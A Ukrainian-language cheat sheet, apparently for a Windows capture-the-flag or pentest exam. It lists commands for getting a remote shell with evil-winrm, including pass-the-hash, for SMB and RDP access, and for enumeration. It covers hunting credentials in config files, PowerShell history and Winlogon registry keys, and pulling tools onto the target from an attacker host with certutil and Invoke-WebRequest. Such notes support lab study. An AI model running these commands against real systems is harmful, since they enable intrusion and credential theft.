# Windows: Cheatsheet

Швидкі команди для Windows-цілі. ← [windows-enum](windows-enum.md)

## З Kali — доступ
```bash
evil-winrm -i $TARGET -u user -p pass          # WinRM shell (5985)
evil-winrm -i $TARGET -u user -H <NTLM-hash>   # pass-the-hash
xfreerdp /u:user /p:pass /v:$TARGET /cert:ignore
netexec smb   $TARGET -u user -p pass --shares
netexec winrm $TARGET -u user -p pass
smbclient //$TARGET/share -U user
```

## На цілі — орієнтація (PowerShell / cmd)
```powershell
whoami /all
hostname ; systeminfo
net user ; net localgroup administrators
ipconfig /all ; netstat -ano
Get-LocalUser ; Get-Process
```

## Пошук файлів / прапорців
```powershell
# за вмістом (літери флагу розбиті сепараторами -_. → regex із шумом)
$fr = 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\{[A-Za-z0-9_]+\}:[0-9]+'
Get-ChildItem C:\ -Recurse -Include *.txt,*.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern $fr
# за іменем
Get-ChildItem C:\ -Recurse -Filter *flag* -ErrorAction SilentlyContinue
cmd: dir C:\*flag* /s /b
```

## Пошук кредів
```powershell
# конфіги
Get-ChildItem C:\ -Recurse -Include web.config,*.config,unattend.xml -ErrorAction SilentlyContinue
# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# у реєстрі (autologon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Передача файлів
```powershell
# з Kali (python3 -m http.server 8000 на 10.8.N.x):
certutil -urlcache -f http://10.8.N.x:8000/tool.exe tool.exe
powershell -c "Invoke-WebRequest http://10.8.N.x:8000/tool.exe -OutFile tool.exe"
# SMB (impacket на Kali): smbserver.py share . -smb2support
copy \\10.8.N.x\share\tool.exe .
```

## Корисні довідники
- WinPEAS — автоenum ескалації/кредів (залити й запустити).
- Для AD (якщо раптом): BloodHound/Kerberoast — **ймовірно поза рівнем тесту**, лише на крайній випадок.
